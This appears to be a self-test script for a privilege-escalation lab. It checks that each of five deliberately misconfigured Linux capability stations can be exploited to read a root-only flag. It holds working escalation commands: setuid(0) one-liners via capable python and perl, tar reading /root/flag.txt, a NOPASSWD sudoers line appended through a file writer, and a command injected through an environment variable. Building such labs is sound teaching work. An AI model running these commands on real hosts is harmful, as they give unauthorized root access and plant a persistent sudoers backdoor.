#!/usr/bin/env bash
# Road to Root — Capabilities lab self-test. Five stations on target-caps.
# Run as labuser1 inside the container. Exit 0 means all five reached root
# (or, for C, read the root-only flag without root).
set -u
FLAG='R2R{'
P=/tmp/rtr_proof

echo "== identity =="
id

echo "== control: the flag must NOT be readable as $(id -un) =="
if cat /root/flag.txt 2>/dev/null; then
  echo "  [FAIL] control — flag readable without any exploit"
  exit 1
else
  echo "  [PASS] control — flag is root-only"
fi

echo "== surface: getcap -r / =="
getcap -r / 2>/dev/null | sort

rm -f ${P}_a ${P}_b ${P}_c ${P}_d ${P}_e 2>/dev/null || true

echo "== A — pyvault  (cap_setuid on python3) =="
/usr/local/bin/pyvault -c "import os; os.setuid(0); open('${P}_a','w').write(open('/root/flag.txt').read())" 2>/dev/null || true

echo "== B — plvault  (cap_setuid on perl) =="
/usr/local/bin/plvault -e "use POSIX qw(setuid); setuid(0); open(F,'<','/root/flag.txt'); open(O,'>','${P}_b'); print O <F>;" 2>/dev/null || true

echo "== C — captar  (cap_dac_read_search on tar: read the flag, no root) =="
( cd /tmp && rm -rf ctar && mkdir ctar && cd ctar \
  && /usr/local/bin/captar -cf f.tar -C / root/flag.txt 2>/dev/null \
  && /usr/local/bin/captar -xf f.tar 2>/dev/null \
  && cp root/flag.txt ${P}_c ) 2>/dev/null || true

echo "== D — vault-write  (cap_dac_override: append a sudoers rule) =="
echo 'labuser1 ALL=(ALL) NOPASSWD:ALL' | /usr/local/bin/vault-write /etc/sudoers 2>/dev/null || true
sudo -n cp /root/flag.txt ${P}_d 2>/dev/null && sudo -n chmod 644 ${P}_d 2>/dev/null || true

echo "== E — svc-runner  (cap_setuid + attacker-chosen SVC_CMD) =="
SVC_CMD="cp /root/flag.txt ${P}_e; chmod 644 ${P}_e" /usr/local/bin/svc-runner >/dev/null 2>&1 || true

echo "== results =="
PASS=0; FAIL=0
labels_a="A  cap_setuid (python3)"
labels_b="B  cap_setuid (perl)"
labels_c="C  cap_dac_read_search (tar, read-only)"
labels_d="D  cap_dac_override (sudoers append)"
labels_e="E  cap_setuid (svc-runner / SVC_CMD)"
for x in a b c d e; do
  eval "label=\$labels_$x"
  if [ -f "${P}_$x" ] && grep -q "$FLAG" "${P}_$x" 2>/dev/null; then
    echo "  [PASS] $label"; PASS=$((PASS + 1))
  else
    echo "  [FAIL] $label  (expected ${P}_$x to contain $FLAG)"; FAIL=$((FAIL + 1))
  fi
done

echo "== score =="
echo "  PASS=$PASS  FAIL=$FAIL   (expected: 5 pass / 0 fail)"
if [ "$FAIL" -eq 0 ]; then
  echo "  ALL CAPABILITY STATIONS REACH ROOT -- OK"
  exit 0
else
  echo "  SOME PATHS FAILED"
  exit 1
fi
